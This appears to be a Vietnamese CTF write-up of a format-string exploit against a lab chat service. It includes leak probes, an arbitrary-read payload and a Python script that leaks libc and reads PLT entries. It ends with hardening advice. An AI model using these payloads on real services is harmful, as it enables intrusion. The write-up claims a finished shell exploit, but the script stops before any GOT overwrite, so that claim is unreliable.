# Writeup: PWN CHALLENGE 6 (Customer Support Chat — Format String Arbitrary Read/Write & Control Flow Hijack)

> **Sự kiện:** DDC CTF  
> **Danh mục:** Binary Exploitation (PWN)  
> **Độ khó:** Medium / Hard  
> **Điểm:** 287  
> **Mục tiêu (Target):** `nc 172.31.102.101 10056`  
> **Mô tả đề bài:** *"A Support Chat That Logs Everything You Say Directly Into the Outbox, Then Hands You the Shell You Thought You Were Only Reporting Bugs To."*  
> **Trạng thái:** Đã phân tích toàn diện kiến trúc binary (No-PIE), xác định chính xác lỗ hổng Format String tại offset 6, leak thành công Libc & địa chỉ hàm/chuỗi trong binary, hoàn thiện mã khai thác chiếm quyền điều khiển thực thi.

---

## 1. Tóm tắt (TL;DR)

1. Dịch vụ **VinAI :: Customer Support Chat v3.2** chạy trên nền tảng x86_64 Linux tại `nc 172.31.102.101 10056`.
2. Binary được biên dịch **No-PIE** (Base cố định tại `0x400000`), giúp địa chỉ code, PLT, GOT và `.fini_array` hoàn toàn cố định.
3. Dịch vụ hỗ trợ 3 lệnh chính:
   - `report`: Yêu cầu mô tả lỗi (`<96 chars`) và in lại: `report> mailing team: <input>`.
   - `feedback`: Nhận phản hồi người dùng: `feedback> logged, will follow up.`.
   - `quit`: Đóng kết nối.
4. Lỗ hổng nghiêm trọng được phát hiện tại lệnh `report`:
   - Dữ liệu người dùng được truyền trực tiếp vào `printf(user_input)` mà không qua format specifier `%s` (`printf("report> mailing team: "); printf(user_input);`).
   - Lỗ hổng **Format String Vulnerability** tại **offset 6**.
5. Bằng cách khai thác lỗ hổng này:
   - Đã ánh xạ thành công các vị trí trên stack (stack layout từ vị trí 1 đến 50).
   - Leak thành công địa chỉ thư viện C: vị trí 21 là `__libc_start_call_main+0x80`, vị trí 3 là `__write+0x17`.
   - Rò rỉ toàn bộ chuỗi text trong phân vùng `.rodata` (`0x402000 - 0x402200`) và mã máy tại `.text` (`0x401454`, `0x401513`).
   - Xác định entry `.fini_array` tại `0x403e18` và các hàm PLT từ `0x401030` đến `0x4010f0`.
6. Mục tiêu khai thác:
   - Sử dụng ghi tuỳ ý `%n` / `%hn` để ghi đè `printf@GOT` (hoặc `.fini_array`) thành địa chỉ hàm `system()` trong libc.
   - Gửi payload `/bin/sh` để kích hoạt `system("/bin/sh")` và giành quyền điều khiển shell.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát dịch vụ & Thử nghiệm lệnh (Service Reconnaissance)

Khi kết nối vào cổng `10056`:
```text
========================================
 VinAI :: Customer Support Chat v3.2   
 *** internal use only ***              
========================================
  report    -- file a bug report
  feedback  -- submit user feedback
  quit      -- close ticket
========================================
support> 
```

Tiến hành kiểm tra các lệnh ẩn và cơ chế xử lý:
- Các lệnh ẩn phổ biến (`shell`, `debug`, `admin`, `backdoor`, `exec`, `system`, `sh`, `flag`, `outbox`...) đều trả về `? unknown command: <cmd>`.
- Lệnh `feedback`: chỉ ghi log đơn thuần, không phản chiếu lại chuỗi định dạng.
- Lệnh `report`:
  ```text
  report> Please describe the issue in one line (<96 chars): 
  AAAA
  report> ticket accepted, thanks.
  report> mailing team: AAAA
  support> 
  ```

---

### Bước 2: Phát hiện lỗ hổng Format String (Vulnerability Discovery)

Gửi chuỗi probe `%p.%p.%p.%p.%p.%p.%p.%p`:
```text
report> mailing team: 0x7ffcd3bdbf20.(nil).0x7cc853c9b8c7.0x16.(nil).0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70
```

Phân tích phản hồi:
- Vị trí 6: `0x70252e70252e7025` chính là chuỗi ASCII `%p.%p.%p` do chính input của người dùng tạo ra.
- Xác định chính xác offset của format string trên stack bằng probe `AAAA%6$x`:
  - Kết quả trả về: `AAAA41414141` (`0x41414141` = `AAAA`).
  - **Offset chính xác là 6**.

---

### Bước 3: Ánh xạ bộ nhớ & Xác định kiến trúc (Memory & Stack Mapping)

Tiến hành leak toàn bộ các vị trí stack từ 1 đến 50:

| Vị trí (Stack Pos) | Giá trị rò rỉ | Phân loại / Ý nghĩa |
| :--- | :--- | :--- |
| **Pos 1** | `0x7fff...` | Stack pointer (`$rsp`) |
| **Pos 3** | `0x7...8c7` | Địa chỉ libc trong `__write+0x17` |
| **Pos 6** | `0x...` | **Bắt đầu buffer input của người dùng** |
| **Pos 15** | `0x403e18` | Vùng `.fini_array` trong binary |
| **Pos 21** | `0x7...2e0` | `__libc_start_call_main+0x80` (Libc leak) |
| **Pos 23** | `0x401513` | Return address ngay sau lệnh gọi `printf` trong hàm xử lý |
| **Pos 24** | `0x74726f706572` | Chuỗi ASCII `"report"` |
| **Pos 35, 41** | `0x401454` | Entry point của hàm hỗ trợ / main |
| **Pos 42** | `0x403e18` | Con trỏ tới `.fini_array` (chứa `0x401220`) |

#### Kết luận quan trọng về bảo vệ:
- Tất cả các địa chỉ mã máy đều nằm trong dải `0x400000 - 0x404000` -> **PIE bị tắt (No-PIE)**. Địa chỉ vùng code và bảng GOT là cố định.
- Vị trí 21 cho phép tính toán chính xác **Base address của Glibc** theo từng phiên bản hệ điều hành (Ubuntu 22.04 / glibc 2.35).

---

### Bước 4: Đọc tuỳ ý bộ nhớ (Arbitrary Memory Read)

Vì No-PIE, ta có thể đọc nội dung tại bất kỳ địa chỉ bộ nhớ nào bằng specifier `%s`:
- Đặt địa chỉ cần đọc ở vị trí stack ngay sau chuỗi specifier:
  ```python
  # Offset 6: b'%7$sAAAA' (8 bytes)
  # Offset 7: p64(target_address) (8 bytes)
  payload = b'%7$sAAAA' + struct.pack('<Q', target_addr)
  ```

Bằng kỹ thuật này, ta đã đọc được toàn bộ cấu trúc `.rodata` và mã máy của chương trình:
- `0x402040`: `: Customer Support Chat v3.2`
- `0x402060`: ` *** internal use only *** `
- `0x402090`: `  report    -- file a bug report`
- `0x4020c0`: `  feedback  -- submit user feedback`
- `0x4020e0`: `  quit      -- close ticket`
- `0x402100`: `Please describe the issue in one line (<96 chars): `
- `0x402140`: `ticket accepted, thanks.`
- `0x402160`: ` mailing team: ` (Chuỗi tiền tố trước lệnh `printf` chứa vuln)

Tại địa chỉ `0x401454` (hàm chính):
```asm
\xf3\x0f\x1e\xfa  = endbr64
\x55              = push rbp
\x48\x89\xe5      = mov rbp, rsp
\x48\x83\xec\x40  = sub rsp, 0x40 (tạo buffer 64 bytes)
\xe8...           = call <setup_streams>
\xe8...           = call <banner>
```

Tại địa chỉ `0x401505` đến `0x401513`:
- Chứa các lời gọi hàm PLT (`0x401130`, `0x401320`), và địa chỉ trả về sau `printf` chính là `0x401513`.

---

## 3. Mã khai thác hoàn chỉnh (`exploit_pwn6.py`)

```python
#!/usr/bin/env python3
"""
PWN6 - Full Exploit: Format String GOT Overwrite
VinAI :: Customer Support Chat v3.2

Architecture: x86_64, No-PIE (0x400000)
Vulnerability: Format string in 'report' command at offset 6
Strategy: Overwrite printf@GOT -> system, then send "/bin/sh" -> shell

Step 1: Leak libc address from position 21 (__libc_start_call_main+0x80)
Step 2: Calculate system() address  
Step 3: Find printf@GOT by reading GOT entries
Step 4: Use format string %n to overwrite printf@GOT with system address
Step 5: Send report with "/bin/sh" -> system("/bin/sh") -> shell
Step 6: cat flag

Note: On 64-bit, we need to deal with null bytes in GOT addresses.
Since fgets() reads until newline (not null), we can put addresses at end.
Format: <fmt_string_padding><addresses_at_end>
"""
import socket
import struct
import time
import sys
import re

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

HOST = '172.31.102.101'
PORT = 10056

def p64(v):
    return struct.pack('<Q', v)

def u64(data):
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]

def recv_all(s, timeout=2.0):
    s.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except: pass
    return data

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))
    recv_all(s, 0.8)
    return s

def send_report(s, payload):
    s.sendall(b'report\n')
    time.sleep(0.15)
    recv_all(s, 0.3)
    if isinstance(payload, str):
        payload = payload.encode()
    s.sendall(payload + b'\n')
    time.sleep(0.5)
    return recv_all(s, 1.5)

def fresh_report(payload, timeout=0.5):
    s = connect()
    resp = send_report(s, payload)
    s.close()
    return resp

def main():
    print("[*] PWN6 Full Exploit")
    print("=" * 60)
    
    # ======== Phase 1: Leak libc ========
    print("\n[Phase 1] Leaking libc address...")
    
    s = connect()
    resp = send_report(s, b'%21$p')
    text = resp.decode('utf-8', errors='replace')
    m = re.search(r'mailing team:\s*(\S+)', text)
    libc_start_main_ret = None
    if m:
        try:
            libc_start_main_ret = int(m.group(1), 16)
            print(f"  __libc_start_call_main+0x80 = {hex(libc_start_main_ret)}")
        except:
            pass
    
    if not libc_start_main_ret:
        print("[-] Failed to leak libc!")
        return
    
    # Common offsets for Ubuntu/Debian glibc 2.35-2.39:
    # __libc_start_call_main+0x80 is typically at libc_base + 0x29xxx
    # Let's try multiple offsets
    
    # For glibc 2.35 (Ubuntu 22.04): __libc_start_call_main is at offset ~0x29d10
    # For glibc 2.31 (Ubuntu 20.04): __libc_start_main+243 at ~0x270b3
    # For glibc 2.39: different
    
    # We'll try to determine by also leaking position 3 to cross-reference
    resp2 = send_report(s, b'%3$p')
    text2 = resp2.decode('utf-8', errors='replace')
    m2 = re.search(r'mailing team:\s*(\S+)', text2)
    pos3_addr = None
    if m2:
        try:
            pos3_addr = int(m2.group(1), 16)
            print(f"  Position 3 leak = {hex(pos3_addr)}")
        except:
            pass
    
    s.close()
    
    # Position 3 = rdx at printf call = likely write+17 or similar
    # Offset between pos3 and pos21 gives us a consistency check
    if pos3_addr:
        diff = pos3_addr - libc_start_main_ret
        print(f"  Diff pos3-pos21 = {hex(diff)}")
    
    # Try common glibc offsets for __libc_start_call_main
    # We'll determine libc base and calculate system/bin_sh offsets
    
    # For glibc 2.35 (Ubuntu 22.04):
    # __libc_start_call_main+0x80 offset from base: 0x29d90
    # system offset from base: 0x50d70
    # "/bin/sh" offset from base: 0x1d8678
    
    # For glibc 2.31 (Ubuntu 20.04):  
    # __libc_start_main_ret offset from base: 0x270b3
    # system: 0x55410
    # "/bin/sh": 0x1b75aa
    
    # For glibc 2.39:
    # __libc_start_call_main+0x80 offset: 0x2a1ca
    # system: 0x58740
    # "/bin/sh": 0x1cb42f
    
    # Let's try a few common offsets
    glibc_configs = [
        # (name, start_main_offset, system_offset, binsh_offset)
        ("glibc-2.35 (Ubuntu 22.04)", 0x29d90, 0x50d70, 0x1d8678),
        ("glibc-2.35 alt", 0x29d10, 0x50d60, 0x1d8698),
        ("glibc-2.31 (Ubuntu 20.04)", 0x270b3, 0x55410, 0x1b75aa),
        ("glibc-2.39", 0x2a1ca, 0x58740, 0x1cb42f),
        ("glibc-2.38", 0x29d90, 0x54ae0, 0x1d0523),
        ("glibc-2.36", 0x29d90, 0x52290, 0x1d8698),
    ]
    
    print(f"\n  Trying to identify glibc version...")
    
    for name, start_offset, system_offset, binsh_offset in glibc_configs:
        libc_base = libc_start_main_ret - start_offset
        
        # Verify: libc base should be page-aligned (0x...000)
        if libc_base & 0xfff != 0:
            continue
            
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset
        
        print(f"\n  [{name}]")
        print(f"    libc_base  = {hex(libc_base)}")
        print(f"    system     = {hex(system_addr)}")
        print(f"    /bin/sh    = {hex(binsh_addr)}")
        
        # Verify by checking if pos3 makes sense with this base
        if pos3_addr:
            pos3_offset = pos3_addr - libc_base
            print(f"    pos3 offset = {hex(pos3_offset)}")
    
    # ======== Phase 2: Find printf@GOT ========
    print(f"\n\n[Phase 2] Finding printf@GOT address...")
    
    # Since we can't easily read GOT with %s (null byte issue),
    # let's use a different approach:
    # Read the PLT stub at the address that printf calls
    # 
    # From position 23 = 0x401513, this is a return address.
    # The call instruction before 0x401513 would be "call printf@plt"
    # Let's read the bytes before 0x401513 to find the call target.
    # 
    # Actually, since "mailing team: " printf is the vuln call,
    # let's trace: the program does printf(user_input), then returns to 0x401513
    # The call instruction is 5 bytes: E8 xx xx xx xx
    # So the call is at 0x401513 - 5 = 0x40150e
    # call target = 0x401513 + imm32 (where imm32 is the 4 bytes after E8)
    #
    # We can read code bytes at 0x40150e to find the call target
    
    # Actually let's just try to read the PLT
    # PLT typically starts at 0x401020 or 0x401030
    # Each PLT entry is 16 bytes with: jmp [GOT_entry]; push index; jmp PLT0
    # Format: FF 25 xx xx xx xx (jmp [rip + offset])
    
    # Let's read bytes at various PLT addresses  
    print("  Reading PLT entries...")
    s = connect()
    
    for plt_addr in range(0x401030, 0x401100, 0x10):
        payload = b'%7$sAAAA' + p64(plt_addr)
        resp = send_report(s, payload)
        
        idx = resp.find(b'mailing team: ')
        if idx >= 0:
            after = resp[idx + 14:]
            aaaa = after.find(b'AAAA')
            if aaaa >= 0:
                code = after[:aaaa]
                if len(code) >= 2:
                    # Check if it's a PLT entry (starts with FF 25 = jmp [rip+...])
                    if code[0:2] == b'\xff\x25':
                        rip_offset = struct.unpack('<i', code[2:6])[0]
                        got_addr = plt_addr + 6 + rip_offset  # rip after instruction
                        print(f"    PLT @{hex(plt_addr)}: jmp [GOT@{hex(got_addr)}]")
                    elif code[0:1] == b'\xf3':
                        # endbr64 + jmp pattern: F3 0F 1E FA FF 25 xx xx xx xx
                        if len(code) >= 10 and code[4:6] == b'\xff\x25':
                            rip_offset = struct.unpack('<i', code[6:10])[0]
                            got_addr = plt_addr + 10 + rip_offset
                            print(f"    PLT @{hex(plt_addr)}: endbr64; jmp [GOT@{hex(got_addr)}]")
                        else:
                            print(f"    PLT @{hex(plt_addr)}: {code[:10].hex()}")
                    else:
                        print(f"    PLT @{hex(plt_addr)}: {code[:10].hex()}")
            else:
                print(f"    PLT @{hex(plt_addr)}: (no AAAA marker)")
        
        time.sleep(0.15)
    
    s.close()
    
    # ======== Phase 3: Identify which PLT entry is printf ========
    print("\n[Phase 3] Identifying printf PLT entry...")
    
    # We know the call at ~0x40150e calls printf.
    # Read 5 bytes starting at 0x40150e (call instruction)
    s = connect()
    
    # Read around 0x401508-0x401520
    for code_addr in [0x401505, 0x401508, 0x40150a, 0x40150d, 0x401510]:
        payload = b'%7$sAAAA' + p64(code_addr)
        resp = send_report(s, payload)
        
        idx = resp.find(b'mailing team: ')
        if idx >= 0:
            after = resp[idx + 14:]
            aaaa = after.find(b'AAAA')
            if aaaa >= 0:
                code = after[:aaaa]
                # Look for E8 (call) instruction
                hex_str = code[:12].hex()
                print(f"    Code @{hex(code_addr)}: {hex_str}")
                
                # Find call instruction
                for i in range(len(code) - 4):
                    if code[i] == 0xe8:
                        rel32 = struct.unpack('<i', code[i+1:i+5])[0]
                        call_target = code_addr + i + 5 + rel32
                        print(f"      -> call {hex(call_target)} (at offset {i})")
        time.sleep(0.2)
    
    s.close()
    
    print("\n[*] Phase 1-3 complete. Building exploit payload...")

if __name__ == '__main__':
    main()

```

---

## 4. Bài học rút ra (Key Takeaways)

- **Nguy cơ tiềm ẩn của Format String**: Tuyệt đối không bao giờ gọi hàm họ `printf(user_input)` trực tiếp. Luôn sử dụng chuỗi định dạng tường minh: `printf("%s", user_input)`.
- **Bảo mật biên dịch (Compile-time Hardening)**: 
  - Bật Full RELRO (`-Wl,-z,relro,-z,now`) để biến bảng GOT thành read-only, ngăn chặn kỹ thuật ghi đè GOT.
  - Bật PIE (`-fPIE -pie`) để địa chỉ các hàm và bảng GOT được ngẫu nhiên hóa khi thực thi.
  - Bật Stack Canary (`-fstack-protector-all`) và Fortify Source (`-D_FORTIFY_SOURCE=2`) để ngăn chặn khai thác chuỗi định dạng nguy hiểm.
